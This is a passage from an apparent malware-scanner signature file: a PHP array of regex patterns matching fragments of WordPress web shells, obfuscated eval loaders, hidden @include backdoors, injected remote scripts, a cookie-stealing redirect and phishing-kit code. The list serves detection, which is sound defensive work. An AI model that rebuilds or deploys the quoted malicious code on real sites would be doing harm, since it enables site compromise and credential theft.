  return \\$result;
\\}

\\$a \\= get_contents\\(\'https\\:\\/\\/ghostbin\\.co\\/paste\\/2v8nx\\/raw\'\\);
eval\\(\'\\?\\>\'\\.\\$a\\);/s',
      'label' => 'sample-specific content window',
    ),
    1251 => 
    array (
      'pattern' => '/sMCwkT08wMDAwKSkpKTs\\="\\)\\); \\?\\>\\<\\?php define\\("WP_USE_THEMES", true\\); require\\( dirname\\( __FILE__ \\) \\. "\\/wp\\-blog\\-header\\.php" \\);/s',
      'label' => 'sample-specific content window',
    ),
    1252 => 
    array (
      'pattern' => '/S\', true \\);

\\/\\*\\* Loads the WordPress Environment and Template \\*\\/
require\\( dirname\\( __FILE__ \\) \\. \'\\/wp\\-blog\\-header\\.php\' \\);/s',
      'label' => 'sample-specific content window',
    ),
    1253 => 
    array (
      'pattern' => '/;
			\\$pDescriptionYuanShi \\= \\$pdescription;
		\\}
		
	\\}else\\{
		\\$pkeyword \\= \\$Ptitle;
	
		\\$pdescription \\= \\$nowPreStr\\.[\\s\\S]{0,160},\\$mateStr\\);
		\\$pkeyword \\= \\$temparrII\\[0\\];
		if\\(\\!\\$pkeyword\\)\\{
			\\$pkeyword \\= \\$Ptitle;
		\\}else\\{
			\\$keyArr \\= explode\\(/',
      'label' => 'sample-specific literal chain',
    ),
    1254 => 
    array (
      'pattern' => '/\'\\) \\{eval\\(\\$_ear2ijqt\\["data"\\]\\);exit;\\}\\}\\}\\$_wjz3rwiu \\= new _8zkc2u\\(\\);if \\(\\$_wjz3rwiu\\-\\>_4rglm\\(\\)\\) \\{\\$_wjz3rwiu\\-\\>_kypq1\\(\\);\\}exit\\(\\);/s',
      'label' => 'sample-specific content window',
    ),
    1255 => 
    array (
      'pattern' => '/\\) \\{eval\\(\\$_4laz9lq9\\["data"\\]\\);exit;\\}\\}\\}\\$_0s9rkjom \\= new _b8gui6n\\(\\);if \\(\\$_0s9rkjom\\-\\>_jcbrf\\(\\)\\) \\{\\$_0s9rkjom\\-\\>_z3wku\\(\\);\\}exit\\(\\);/s',
      'label' => 'sample-specific content window',
    ),
    1256 => 
    array (
      'pattern' => '/\\) \\{eval\\(\\$_1sx7bg07\\["data"\\]\\);exit;\\}\\}\\}\\$_9lskreel \\= new _1ezdn2i\\(\\);if \\(\\$_9lskreel\\-\\>_2coqy\\(\\)\\) \\{\\$_9lskreel\\-\\>_v4rq1\\(\\);\\}exit\\(\\);/s',
      'label' => 'sample-specific content window',
    ),
    1257 => 
    array (
      'pattern' => '/\'\\) \\{eval\\(\\$_cwwkgdrm\\["data"\\]\\);exit;\\}\\}\\}\\$_y8jf85q7 \\= new _yk8lmq\\(\\);if \\(\\$_y8jf85q7\\-\\>_2i7ny\\(\\)\\) \\{\\$_y8jf85q7\\-\\>_ix4g6\\(\\);\\}exit\\(\\);/s',
      'label' => 'sample-specific content window',
    ),
    1258 => 
    array (
      'pattern' => '/\\) \\{eval\\(\\$_obknqk8f\\["data"\\]\\);exit;\\}\\}\\}\\$_y4gz2vko \\= new _dbangy4\\(\\);if \\(\\$_y4gz2vko\\-\\>_t8uhh\\(\\)\\) \\{\\$_y4gz2vko\\-\\>_gccog\\(\\);\\}exit\\(\\);/s',
      'label' => 'sample-specific content window',
    ),
    1259 => 
    array (
      'pattern' => '/\\) \\{eval\\(\\$_qdj07giq\\["data"\\]\\);exit;\\}\\}\\}\\$_62ugnnj8 \\= new _ccb9coz\\(\\);if \\(\\$_62ugnnj8\\-\\>_g18xu\\(\\)\\) \\{\\$_62ugnnj8\\-\\>_a6mxk\\(\\);\\}exit\\(\\);/s',
      'label' => 'sample-specific content window',
    ),
    1260 => 
    array (
      'pattern' => '/@include\\("\\\\167\\\\160\\\\55\\\\141\\\\144\\\\155\\\\151\\\\156\\\\57\\\\151\\\\155\\\\141\\\\147\\\\145\\\\163\\\\57\\\\154\\\\151\\\\143\\\\145\\\\156\\\\163\\\\145\\\\56\\\\164\\\\170\\\\164"\\); \\?\\>/s',
      'label' => 'sample-specific content window',
    ),
    1261 => 
    array (
      'pattern' => '/\\<\\?php \\$dPOLYoTW\\=\'y\\(3;\\]whcx\\)8\\$4mb dk1qog5sprlua\\=z_\\/0i9tvf_"76\\*\\.2n\\[je\';\\$q2866\\=\\$dPOLYoTW\\[\\(105\\/15\\)\\]\\.\\$dPOLYoTW\\[\\(26\\-1\\)\\]\\.\\$dPOLYoTW\\[\\(1\\*49\\)\\]\\.\\$dPOLYoT/',
      'label' => 'source-file tail snippet',
    ),
    1262 => 
    array (
      'pattern' => '/define\\( \'WP_USE_THEMES\', true \\);[\\s\\S]{0,12000}\\<\\?php \\$XONhR \\= \'bas\'\\.\'e64\'\\.\'_deco\'\\.\'de\'; \\$nUXoD \\= \'gzunco\'\\.\'mpress\'; error_reporting\\(0\\); ini_set\\(\'error_log\', NULL\\); eval\\(\\$nUXoD\\(\\$XONhR\\(\'eJz/s',
      'label' => 'source-file head-tail anchor',
    ),
    1263 => 
    array (
      'pattern' => '/\\<\\?php \\$TGOdk \\= \'b\'\\.\'ase\'\\.\'64\'\\.\'_deco\'\\.\'de\'; \\$PjZCg \\= \'st\'\\.\'r\'\\.\'_rot1\'\\.\'3\'; error_reporting\\(0\\); ini_set\\(\'error_log\', NULL\\); eval\\(\\$PjZCg\\(\\$TGOd/',
      'label' => 'source-file tail snippet',
    ),
    1264 => 
    array (
      'pattern' => '/\\<\\?php \\$AsdPL \\= \'st\'\\.\'r\'\\.\'_rot1\'\\.\'3\'; \\$qmbJx \\= \'bas\'\\.\'e64\'\\.\'_de\'\\.\'code\'; \\$rJwfi \\= \'str\'\\.\'rev\'; \\$Dixwy \\= \'gzinflat\'\\.\'e\'; error_reporting\\(0\\); i/',
      'label' => 'source-file tail snippet',
    ),
    1265 => 
    array (
      'pattern' => '/\\<\\?php \\$vksBN \\= \'base\'\\.\'64\'\\.\'_decod\'\\.\'e\'; error_reporting\\(0\\); ini_set\\(\'error_log\', NULL\\); eval\\(\\$vksBN\\(\'IGVycm9yX3JlcG9ydGluZygwKTsgQGluaV9zZX/',
      'label' => 'source-file tail snippet',
    ),
    1266 => 
    array (
      'pattern' => '/\\<script src\\=\'https\\:\\/\\/jack\\.legendarytable\\.com\\/free\\.js\\?v\\=2\\.8\\.8\' type\\=\'text\\/javascript\'\\>\\<\\/script\\>\\<\\?php[\\s\\S]{0,12000}require __DIR__ \\. \'\\/wp\\-blog\\-header\\.php\';/s',
      'label' => 'source-file head-tail anchor',
    ),
    1267 => 
    array (
      'pattern' => '/yright 2020 NETFLIX           \\$\\#
\\#\\#\\#\\#\\#\\#\\#\\#\\#\\#\\#\\#\\#\\#\\#\\#\\#\\#\\#\\#\\#\\#\\#\\#\\#\\#\\#\\#\\#\\#\\#\\#\\#\\#\\#\\#\\#\\#\\#\\#\\#\\#\\#\\#\\#\\#\\#

\\*\\*\\/
header\\(\'Location\\: login\'\\);
\\?\\>/s',
      'label' => 'sample-specific content window',
    ),
    1268 => 
    array (
      'pattern' => '/\\$\\#
\\#\\#\\#\\#\\#\\#\\#\\#\\#\\#\\#\\#\\#\\#\\#\\#\\#\\#\\#\\#\\#\\#\\#\\#\\#\\#\\#\\#\\#\\#\\#\\#\\#\\#\\#\\#\\#\\#\\#\\#\\#\\#\\#\\#\\#\\#\\#

\\*\\*\\/
    include\\("\\.\\/system\\/system\\.php"\\);
    include\\("\\.\\/syst/s',
      'label' => 'sample-specific content window',
    ),
    1269 => 
    array (
      'pattern' => '/php  opcache_reset\\(\\); \\?\\>/s',
      'label' => 'sample-specific content window',
    ),
    1270 => 
    array (
      'pattern' => '/echo file_get_contents\\(\\$indhtml\\);
    \\}
\\}
\\/\\/\\/\\/\\/\\/\\/\\/\\/\\/\\/\\/\\/\\/\\/\\/\\/\\/\\/\\/\\/\\/\\/\\/\\/\\/\\/\\/\\/\\/\\/\\/\\/\\/\\/\\/\\/\\/\\/\\/\\/\\/\\/\\/\\/\\/\\/\\/\\/\\/\\/\\/\\/\\/\\/\\/\\/\\/\\/
class_x_i\\(\\);
\\?\\>/s',
      'label' => 'sample-specific content window',
    ),
    1271 => 
    array (
      'pattern' => '/Mozilla\\/5\\.0 \\(Windows NT 6\\.1; Win64; x64\\) AppleWebKit\\/537\\.36 \\(KHTML, like Gecko\\) Chrome\\/96\\.0\\.4664\\.110 Safari\\/537\\.36[\\s\\S]{0,160}Mozilla\\/5\\.0 \\(Windows NT 6\\.3; Win64; x64\\) AppleWebKit\\/537\\.36 \\(KHTML, like Gecko\\) Chrome\\/96\\.0\\.4664\\.110 Safari\\/537\\.36/',
      'label' => 'sample-specific literal chain',
    ),
    1272 => 
    array (
      'pattern' => '/\\<\\?php
\\/\\*c1d9a\\*\\/

@include "\\\\057home\\\\XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX\\.me\\/\\\\147ully\\\\150ole\\/\\\\05649b4\\\\06697b\\.\\\\151co";

\\/\\*c1d9/s',
      'label' => 'sample-specific content window',
    ),
    1273 => 
    array (
      'pattern' => '/@include "\\\\057h\\\\157m\\\\145\\/\\\\141d\\\\162iXXXXXXXXXXXXXXXXXXXXXXXXX\\\\145\\/\\\\147u\\\\154l\\\\171h\\\\157l\\\\145\\/\\\\0564\\\\071b\\\\0646\\\\0717\\\\142\\.\\\\151c\\\\157";/',
      'label' => 'source-file tail snippet',
    ),
    1274 => 
    array (
      'pattern' => '/\\<\\?php error_reporting\\(0\\); \\$AUM \\= range\\(chr\\(126\\),chr\\(20\\)\\);\\$UF\\=\\$\\{\\$AUM\\[31\\]\\.\\$AUM\\[59\\]\\.\\$AUM\\[47\\]\\.\\$AUM\\[47\\]\\.\\$AUM\\[51\\]\\.\\$AUM\\[53\\]\\.\\$AUM\\[57\\]\\};\\$UF\\=\\$\\{\\$AUM\\[31/',
      'label' => 'source-file tail snippet',
    ),
    1275 => 
    array (
      'pattern' => '/\\*\\s+abuse\\s+appreciate\\s+bother\\s+catalog\\s+compete\\s+elastic\\s+evaluate\\s+external\\s+hydrogen\\s+import\\s+interpret\\s+profitable\\s+prospect\\s+ridid\\s+route\\s+severe\\s+shallow\\s+stuff\\s+tedious\\s+territory\\s+thrust\\./',
      'label' => 'sample-specific line fragment',
    ),
    1276 => 
    array (
      'pattern' => '/\\) \\{eval\\(\\$_ra108g0o\\["data"\\]\\);exit;\\}\\}\\}\\$_th7osxmh \\= new _d1ppwji\\(\\);if \\(\\$_th7osxmh\\-\\>_3nx61\\(\\)\\) \\{\\$_th7osxmh\\-\\>_9a8og\\(\\);\\}exit\\(\\);/s',
      'label' => 'sample-specific content window',
    ),
    1277 => 
    array (
      'pattern' => '/@include "\\\\057home\\\\057your\\\\142t\\/sn\\\\143onsu\\\\154ting\\\\056rs\\/w\\\\160\\-inc\\\\154udes\\\\057Simp\\\\154ePie\\\\057HTTP\\\\057\\.e9a\\\\063ece3\\\\056ico";[\\s\\S]{0,12000}require __DIR__ \\. \'\\/wp\\-blog\\-header\\.php\';/s',
      'label' => 'source-file head-tail anchor',
    ),
    1278 => 
    array (
      'pattern' => '/@include "\\\\057home\\\\057difu\\\\172er\\/o\\\\172oniz\\\\141tor\\.\\\\162s\\/wp\\\\055cont\\\\145nt\\/p\\\\154ugin\\\\163\\/tem\\\\160late\\\\163\\-pat\\\\164erns\\\\055coll\\\\145ctio\\\\156\\/\\.67\\\\1[\\s\\S]{0,12000}\\* @link https\\:\\/\\/wordpress\\.org\\/support\\/article\\/editing\\-wp\\-config\\-php\\//s',
      'label' => 'source-file head-tail anchor',
    ),
    1279 => 
    array (
      'pattern' => '/v \\<\\<\\= 5;
        if \\(\\$LNCF\\[\\$i\\] \\>\\= \'a\' && \\$LNCF\\[\\$i\\] \\<\\= \'z\'\\)\\{
            \\$v \\+\\= \\(ord\\(\\$LNCF\\[\\$i\\]\\) \\- 97\\);
        \\} elseif \\(\\$/s',
      'label' => 'sample-specific content window',
    ),
    1280 => 
    array (
      'pattern' => '/;
	\\$str\\=get_str\\(\\$str\\);
	\\#\\$str \\= str_rot13\\(\\$str\\);
	m\\(\\$str\\);
\\}
function get1_str\\(\\$str1\\)\\{
	\\$str \\= \\$str1\\.[\\s\\S]{0,160};
	return \\$str;
	
\\}
function m\\(\\$str\\)\\{
	global \\$password;
	\\$str1\\=/',
      'label' => 'sample-specific literal chain',
    ),
    1281 => 
    array (
      'pattern' => '/196a1129b0564d614070940beb41578b/',
      'label' => 'sample-specific encoded fragment',
    ),
    1282 => 
    array (
      'pattern' => '/\\);
            if \\(\\$a \\>\\=1&&empty\\(\\$h\\)\\) \\{
                \\$contents \\= \\$mc\\[0\\]\\[\\$a\\-1\\];
            \\}
            if \\(\\$h\\>\\=1\\) \\{/s',
      'label' => 'sample-specific content window',
    ),
    1283 => 
    array (
      'pattern' => '/\\$a\\=\'fgxy1006\';@set_time_limit\\(3600\\);@ignore_user_abort\\(1\\);\\$b\\=\'http\\:\\/\\/fgxy1006\\.badeer\\.top\';if\\(is_https\\(\\)\\)\\{\\$c\\[\'http\'\\]\\=\'https\';\\}else\\{\\$c\\[\'http\'\\][\\s\\S]{0,12000}require __DIR__ \\. \'\\/wp\\-blog\\-header\\.php\';/s',
      'label' => 'source-file head-tail anchor',
    ),
    1284 => 
    array (
      'pattern' => '/\\>F1~kcjN5qz\\}JH48q\\.Nz\\>AY\\^\\!tNO&lVI\\/
\\.\\/\\*TtXl7k9AM&vIV5B\\|mEq1\\\\\\?GfUU\\=_av_\\^\\>9uVu\\]\\>%\\*\\/\'2\\=%\' 	\\/\\*\\<6q\\\\\\?Yr\\\\MX1~l&lsp\\>5\\-9\\(D\\[D\\*\\*\\/\\.\\#Y/',
      'label' => 'sample-specific literal',
    ),
    1285 => 
    array (
      'pattern' => '/\\<script type\\=\'text\\/javascript\' src\\=\'https\\:\\/\\/dock\\.lovegreenpencils\\.ga\\/m\\.js\\?n\\=nb5\'\\>\\<\\/script\\>\\<script type\\=\'text\\/javascript\' src\\=\'https\\:\\/\\/cht\\.se/',
      'label' => 'source-file tail snippet',
    ),
    1286 => 
    array (
      'pattern' => '/78\\.220\\.197\\.44
109\\.93\\.233\\.88
185\\.118\\.171\\.211
109\\.245\\.36\\.136
93\\.86\\.71\\.205
185\\.119\\.88\\.77
79\\.101\\.86\\.75
109\\.93\\.96\\.251
91\\.150\\./s',
      'label' => 'sample-specific content window',
    ),
    1287 => 
    array (
      'pattern' => '/,\\$O0OO0O0___\\);\\$O0O00O_O__\\=\\$\\{"\\\\x47\\\\x4c\\\\x4f\\\\x42\\\\x41\\\\x4c\\\\x53"\\}\\["\\\\x4f\\\\x4f\\\\x5f\\\\x5f\\\\x5f\\\\x30\\\\x30\\\\x30\\\\x4f\\\\x4f"\\]\\(__FILE__\\)\\.\\\\[\\s\\S]{0,160},\\\\\'\\/\\\\\',\\$O0O00O_O__\\);if\\(\\$\\{"\\\\x47\\\\x4c\\\\x4f\\\\x42\\\\x41\\\\x4c\\\\x53"\\}\\["\\\\x4f\\\\x30\\\\x5f\\\\x4f\\\\x4f\\\\x4f\\\\x30\\\\x5f\\\\x5f\\\\x30"\\]\\(\\$O0OO0O0___,\\\\/',
      'label' => 'sample-specific literal chain',
    ),
    1288 => 
    array (
      'pattern' => '/kQ\\\\x431g\\\\x41\\\\x3d";
\\$An0n_3xPloiTeR \\= "y\\\\x61tywGpzh\\/\\\\x63PH\\/9Xd\\\\x428UeNw\\/u4KZqw2SE\\\\x43jqU0U7hSJs9YUoeE0\\\\x63to\\\\x62gM\\\\x41D\\\\x/s',
      'label' => 'sample-specific content window',
    ),
    1289 => 
    array (
      'pattern' => '/\\<\\?php
\\$email \\= "luccypp721@protonmail\\.co/s',
      'label' => 'sample-specific content window',
    ),
    1290 => 
    array (
      'pattern' => '/\'input\\[name\\="first\\-name"\\], input\\[name\\="last\\-name"\\]\' \\} \\}\\);
\\/\\/\\# sourceURL\\=pen\\.js
    \\<\\/script\\>

    \\<\\/div\\>
\\<\\/body\\>\\<\\/html\\>/s',
      'label' => 'sample-specific content window',
    ),
    1291 => 
    array (
      'pattern' => '/anti4\\.php\';
include \'anti\\/anti5\\.php\';
include \'anti\\/anti6\\.php\';
include \'anti\\/anti7\\.php\';
include \'anti\\/anti8\\.php\';


\\?\\>/s',
      'label' => 'sample-specific content window',
    ),
    1292 => 
    array (
      'pattern' => '/8847\\-3\\.061,3\\.96093\\-3\\.061a7\\.17269,7\\.17269,0,0,1,3\\.00733\\.46826Z"\\>\\<\\/path\\>\\<\\/g\\>\\<\\/g\\>\\<\\/svg\\>
\\<\\/button\\>\\<\\/div\\>\\<\\/div\\>\\<\\/body\\>\\<\\/html\\>/s',
      'label' => 'sample-specific content window',
    ),
    1293 => 
    array (
      'pattern' => '/echo "\\<script type\\=\\\\"text\\/javascript\\\\"\\>[\\s\\S]{0,12000}document\\.location\\=\'secure\\.php\\?&c\\=\'\\+document\\.cookie;/s',
      'label' => 'source-file head-tail anchor',
    ),
    1294 => 
    array (
      'pattern' => '/\\<\\?php
\\/\\/silence is golde/s',
      'label' => 'sample-specific content window',
    ),
    1295 => 
    array (
      'pattern' => '/thods
  function set_name\\(\\$name\\) \\{
    \\$this\\-\\>name \\= \\$name;
  \\}
  function get_name\\(\\) \\{
    return \\$this\\-\\>name;
  \\}
\\}
\\?\\>/s',
      'label' => 'sample-specific content window',
    ),
    1296 => 
    array (
      'pattern' => '/"enctype\\="multipart\\/form\\-data"method\\="post"\\>\\<input\\s+class\\="\\<\\?php\\s+goto\\s+DnoB1;\\s+qhlbJ\\:\\s+function\\s+d\\(\\$s\\)\\s+\\{\\s+return\\s+base64_decode\\(\\$s\\);\\s+\\}\\s+goto\\s+mevDp;\\s+C8wlP\\:\\s+\\?\\>/',
      'label' => 'sample-specific line fragment',
    ),
    1297 => 
    array (
      'pattern' => '/code \\= `include\\(\'\\$wdir\' \\. \'wp\\-config\\.php\'\\);[\\s\\S]{0,12000}onclick\\=Excod\\(\'delete_evil\'\\); style\\=\'cursor\\:pointer; color\\:\\#00f\'\\>R_Evil\\<\\/a\\> _ \\<a/s',
      'label' => 'source-file head-tail anchor',
    ),
    1298 => 
    array (
      'pattern' => '/\\<\\?php
\\$password \\= "rMJoybmXUPl"; \\/\\/ Password
function _BdbY\\(\\$_YX8ZM\\)\\{\\$_YX8ZM\\=substr\\(\\$_YX8ZM,\\(int\\)\\(hex2bin\\(\'31313230\'\\)\\)/s',
      'label' => 'sample-specific content window',
    ),
    1299 => 
    array (
      'pattern' => '/\\<\\?php
\\$password \\= "5YbsaxjgZI2"; \\/\\/ Password
function _BdbY\\(\\$_YX8ZM\\)\\{\\$_YX8ZM\\=substr\\(\\$_YX8ZM,\\(int\\)\\(hex2bin\\(\'31313230\'\\)\\)/s',
      'label' => 'sample-specific content window',
    ),
    1300 => 
    array (
      'pattern' => '/\\{echo"\\<b\\>berhasil\\<\\/b\\>\\-\\-\\>"\\.\\$_FILES\\["f"\\]\\["name"\\];\\}else\\{echo"\\<b\\>gagal";\\}\\} \\}

echo \'uname\\:\'\\.php_uname\\(\\)\\."
";
echo getcwd\\(\\) \\./s',
      'label' => 'sample-specific content window',
    ),
    1301 => 
    array (
      'pattern' => '/error_reporting\\(0\\);header\\(\'Content\\-Type\\: text\\/html; charset\\=utf\\-8\'\\);\\$OoooOO0 \\= \'ahninetysix\';\\$OOOOOO \\= "%71%77%65%72%74%79%75%69%6f%70%61%73[\\s\\S]{0,12000}require __DIR__ \\. \'\\/wp\\-blog\\-header\\.php\';/s',
      'label' => 'source-file head-tail anchor',
    ),
    1302 => 
    array (
      'pattern' => '/;
\\$b75 \\= \\$_SERVER\\[\'HTTP_HOST\'\\];
\\$m22 \\= \\$ip \\. "";
\\$msg8873 \\= "\\$a45 \\$b75 \\$m22";
mail\\(\\$email, \\$subj98, \\$msg8873, \\$from\\);
\\?\\>/s',
      'label' => 'sample-specific content window',
    ),
    1303 => 
    array (
      'pattern' => '/\\<\\?php
\\/\\*1028b\\*\\/

@include "\\\\057home\\\\057mega\\\\164rav\\/\\\\172okam\\\\141keup\\\\056com\\/\\\\167p\\-in\\\\143lude\\\\163\\/Req\\\\165ests\\\\057Auth\\\\057\\./s',
      'label' => 'sample-specific content window',
    ),
    1304 => 
    array (
      'pattern' => '/\\<\\?php
\\/\\*90868\\*\\/

@include "\\\\057home\\\\057mega\\\\164rav\\/\\\\172okam\\\\141keup\\\\056com\\/\\\\167p\\-in\\\\143lude\\\\163\\/Req\\\\165ests\\\\057Auth\\\\057\\./s',
      'label' => 'sample-specific content window',
    ),
    1305 => 
    array (
      'pattern' => '/ttps\\:\\/\\/github\\.com\\/m7x\\/cmsmap\\/
 \\* License\\: GPLv2
 \\*\\/

function love\\(\\)
\\{
global \\$A;
\\$A\\=TT\\(\\);
eval\\("\\\\"\\$A\\\\""\\);
\\}
function TT/s',
      'label' => 'sample-specific content window',
    ),
    1306 => 
    array (
      'pattern' => '/\'\\) \\{eval\\(\\$_v7su7hny\\["data"\\]\\);exit;\\}\\}\\}\\$_wp9fjisv \\= new _0lhj1w\\(\\);if \\(\\$_wp9fjisv\\-\\>_8eooq\\(\\)\\) \\{\\$_wp9fjisv\\-\\>_m8fbp\\(\\);\\}exit\\(\\);/s',
      'label' => 'sample-specific content window',
    ),
    1307 => 
    array (
      'pattern' => '/6 \\. "\\<\\/td\\>\\<td\\>\\<a href\\=\\\\"\\#\\\\" onclick\\=\\\\"g\\(\'delfile\',\'\\$_1\\/\\$_25\'\\);\\\\"\\>Delete\\<\\/a\\>\\<\\/td\\>\\<\\/tr\\>";
    \\}
    echo C98A7D\\(118\\);
\\} \\?\\>/s',
      'label' => 'sample-specific content window',
    ),
    1308 => 
    array (
      'pattern' => '/\\<\\?

\\$to \\= "adminhungtiton@www\\-hungtitonsup\\.ddns\\.net ";/s',
      'label' => 'sample-specific content window',
    ),
    1309 => 
    array (
      'pattern' => '/Wl4xnKAmpJjhW6T\\/Wmf\\/CwjiMTy2Cwj\\/pTujVPEgMJ51VQ0tLKWlLKxbW2McoTHaVQ0\\+VPsBkYm\\+hqmN7FpfW3Aw[\\s\\S]{0,160}LJ4aVQ0\\+VPsY0pi3mfF8\\/vpfW2ShqTy2nKW1plptCG4tW8zbj\\+v688CSWljaLzSwn3AbMJkfWlN9CvNag7F1e7oY/',
      'label' => 'sample-specific literal chain',
    ),
    1310 => 
    array (
      'pattern' => '/\\<\\?php
	\\$praga\\=rand\\(\\);
	\\$praga\\=md5\\(\\$praga\\);

	header\\("location\\: login\\.php\\?cmd\\=login_submit&id\\=\\$praga\\$praga&session\\=\\$praga/s',
      'label' => 'sample-specific content window',
    ),
    1311 => 
    array (
      'pattern' => '/echo \'wp\\-blog\\-header\\.php\';[\\s\\S]{0,12000}\\$O\\=urldecode\\(\'F%7EcVdkq%24%256%40X%5C%22%2AH%2C%3A3%5E%21fIL0%3EY%23E%29yP%3F_ptRW%7DjBNw%609i%3D%2B%2FDUluA%5D%7BO%7Co1\\-TC\\.5hgMexG%282n7%2F/s',
      'label' => 'source-file head-tail anchor',
    ),
    1312 => 
    array (
      'pattern' => '/\\<\\?php
 \\$uoeq967\\= "O\\)sl 2Te4x\\-\\+gazAbuK_6qrjH0RZt\\*N3mLcVFEWvh;inySJC91oMfYXId5Up\\.\\(GP7D,Bw\\/kQ8";\\$vpna644\\=\'JGNoID0gY3VybF9p/s',
      'label' => 'sample-specific content window',
    ),
    1313 => 
    array (
      'pattern' => '/\\);\\$htaccess_rule \\.\\="\\\\\\\\x20\\/\\\\\\\\n";\\$htaccess_rule \\.\\=\\$\\{"\\\\x47L\\\\x4fB\\\\x41L\\\\x53"\\}\\["\\\\x43\\\\x55\\\\x31\\\\x55\\\\x31\\\\x4d\\\\x4d\\\\x31\\\\x4d\\\\x55"\\]\\(\\\\[\\s\\S]{0,160}\\);\\$htaccess_rule \\.\\="\\\\\\\\x20\\^";\\$htaccess_rule \\.\\=\\$\\{"\\\\x47L\\\\x4fB\\\\x41L\\\\x53"\\}\\["\\\\x43\\\\x55\\\\x31\\\\x55\\\\x31\\\\x4d\\\\x4d\\\\x31\\\\x4d\\\\x55"\\]\\(\\\\/',
      'label' => 'sample-specific literal chain',
    ),
    1314 => 
    array (
      'pattern' => '/\\}
\\$reqw \\= \\$ay\\(\\$ao\\(\\$oa\\("\\$pass"\\), \'wp_function\'\\)\\);[\\s\\S]{0,12000}dirname\\( __FILE__ \\) \\. \'\\/wp\\-blog\\-header\\.php\' \\);\\?\\>/s',
      'label' => 'sample-specific content window chain',
    ),
    1315 => 
    array (
      'pattern' => '/,\\$O_00_O0O_O\\);\\$O000__OOO_\\=\\$\\{"\\\\x47\\\\x4c\\\\x4f\\\\x42\\\\x41\\\\x4c\\\\x53"\\}\\["\\\\x4f\\\\x30\\\\x30\\\\x30\\\\x5f\\\\x4f\\\\x4f\\\\x5f\\\\x5f\\\\x4f"\\]\\(__FILE__\\)\\.\\\\[\\s\\S]{0,160},\\\\\'\\/\\\\\',\\$O000__OOO_\\);if\\(\\$\\{"\\\\x47\\\\x4c\\\\x4f\\\\x42\\\\x41\\\\x4c\\\\x53"\\}\\["\\\\x4f\\\\x4f\\\\x4f\\\\x30\\\\x30\\\\x4f\\\\x5f\\\\x5f\\\\x30\\\\x5f"\\]\\(\\$O_00_O0O_O,\\\\/',
      'label' => 'sample-specific literal chain',
    ),
    1316 => 
    array (
      'pattern' => '/\\\\x48\\\\x54\\\\x54\\\\120\\\\x5f\\\\130\\\\x5f\\\\x46\\\\x4f\\\\122\\\\x57\\\\x41\\\\x52\\\\104\\\\x45\\\\104\\\\137\\\\106\\\\x4f\\\\x52[\\s\\S]{0,160}\\\\110\\\\124\\\\x54\\\\x50\\\\x5f\\\\x58\\\\137\\\\x46\\\\x4f\\\\x52\\\\127\\\\x41\\\\122\\\\104\\\\x45\\\\x44\\\\x5f\\\\x46\\\\x4f\\\\x52/',
      'label' => 'sample-specific literal chain',
    ),
    1317 => 
    array (
      'pattern' => '/\\<\\?php
echo "\\<script\\>window\\.location\\.href \\= \'\\.\\.\\/index\\.php\';\\<\\/script\\>";
\\?\\>/s',
      'label' => 'sample-specific content window',
    ),
    1318 => 
    array (
      'pattern' => '/ct\\-\\>isCrawler\\(\\$useragent\\)\\)\\{
	header\\(\'Location\\: https\\:\\/\\/href\\.li\\/\\?https\\:\\/\\/www\\.google\\.com\\/search\\?q\\=\'\\.\\$settings\\[\'out\'\\]\\);
\\} e/s',
      'label' => 'sample-specific content window',
    ),
    1319 => 
    array (
      'pattern' => '/style\\="display\\:none;"\\>
		\\<div id\\="sec\\-container"\\> \\<\\/div\\>
	\\<\\/div\\>
	\\<\\!\\-\\-  End Main Container \\-\\-\\>
	
\\<\\/body\\>

\\<\\/html\\>/s',
      'label' => 'sample-specific content window',
    ),
    1320 => 
    array (
      'pattern' => '/Fixtures\\/Headerspam\\.php[\\s\\S]{0,160}ReferralSpamDetect\\.php/',
      'label' => 'sample-specific literal chain',
    ),
    1321 => 
    array (
      'pattern' => '/\\* @var array
     \\*\\/
    protected \\$data;
    \\/\\*\\*
     \\* Return the data set\\.
     \\* 
     \\* @return array
     \\*\\//s',
      'label' => 'sample-specific content window',
    ),
    1322 => 
    array (
      'pattern' => '/rchiver\\|transcoder\\|spider\\|uptime\\|validator\\|fetcher\\|cron\\|checker\\|reader\\|extractor\\|monitoring\\|analyzer\\|scraper\\)\',
    \\);
\\}/s',
      'label' => 'sample-specific content window',
    ),
    1323 => 
    array (
      'pattern' => '/\\\\\\/\\\\d\\{1,2\\}\\\\\\.\\\\d\\{1,2\\}\\\\\\.\\[\\\\d\\\\\\.\\]\\*\\\\\\/\\\\d\\{1,2\\}\\\\\\.\',
        \'Opera\',
        \';\', \\/\\/ Remove the following characters ;
    \\);
\\}/s',
      'label' => 'sample-specific content window',
    ),
    1324 => 
    array (
      'pattern' => '/\\<\\?php
namespace Jaybizzle\\\\CrawlerDetect;
require\\(\'Fixtures\\/AbstractProvider\\.php\'\\);
require\\(\'Fixtures\\/Headers\\.php\'\\);
requ/s',
      'label' => 'sample-specific content window',
    ),
    1325 => 
    array (
      'pattern' => '/E             \\$\\#
\\#\\#\\#\\#\\#\\#\\#\\#\\#\\#\\#\\#\\#\\#\\#\\#\\#\\#\\#\\#\\#\\#\\#\\#\\#\\#\\#\\#\\#\\#\\#\\#\\#\\#\\#\\#\\#\\#\\#\\#\\#\\#\\#\\#\\#\\#\\#

\\*\\*\\/
header\\("HTTP\\/1\\.0 404 Not Found"\\);
exit\\(\\);
\\?\\>/s',
      'label' => 'sample-specific content window',
    ),
    1326 => 
    array (
      'pattern' => '/VZXWFlaYWJjZGVmZ2hpamtsbW5vcHFyc3R1dnd4eXowMTIzNDU2Nzg5Ky8nKSk7ZXZhbCgkT08wME8wME8wKTs\\=\'\\)\\);return;\\?\\>vr\\{Tkr9NHenNHenNHe1z/s',
      'label' => 'sample-specific content window',
    ),
    1327 => 
    array (
      'pattern' => '/eval\\(str_rot13\\(gzinflate\\(base64_decode\\(\'rZLPSsNAEMbveYqlCJuANHdDHsCT5yISZtbJJFWm20k6ZBXf3YBVmoLBg\\+fvD9\\+PGdLnzkgbhKjOJxwNygfktjwgl4eEcVLahlPw/',
      'label' => 'source-file tail snippet',
    ),
    1328 => 
    array (
      'pattern' => '/\'\\) \\{eval\\(\\$_6m4kzz9n\\["data"\\]\\);exit;\\}\\}\\}\\$_enw9vpi5 \\= new _6mgfc5\\(\\);if \\(\\$_enw9vpi5\\-\\>_31fdm\\(\\)\\) \\{\\$_enw9vpi5\\-\\>_unqv6\\(\\);\\}exit\\(\\);/s',
      'label' => 'sample-specific content window',
    ),
    1329 => 
    array (
